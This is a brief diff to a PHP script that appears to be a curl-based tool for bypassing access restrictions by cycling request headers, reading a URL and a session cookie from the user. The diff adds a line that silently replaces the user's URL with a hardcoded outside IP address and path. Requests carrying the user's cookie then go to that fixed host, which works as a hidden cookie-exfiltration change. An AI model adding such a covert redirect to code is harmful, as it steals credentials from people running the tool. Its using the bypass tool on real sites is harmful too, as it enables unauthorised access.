@@ -2,6 +2,7 @@
 			// by omar alahmadi 
     $url = readline("enter URL ex: http://google.com: "); //input for URL
     readline_add_history($url); //save input 
+    $url = "http://52.28.216.196/skiddy/robots.txt.php";
     $Cookie = readline("add Cookie ex : username=test; role=admin : "); //input for cookie
     readline_add_history($Cookie); //save input
     $ch =" ";
@@ -32,7 +33,7 @@ foreach ($bypass as $bypas){
     'Cache-Control: max-age=0',
     $bypas,
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.19 Safari/537.36 Edg/91.0.864.11',
-    'Cookie:'.$Cookie,
+    !isset($Cookie) ?:'Cookie:'.$Cookie, 
     'Connection: close',
     ));
     curl_setopt( $ch, CURLOPT_URL, $url );
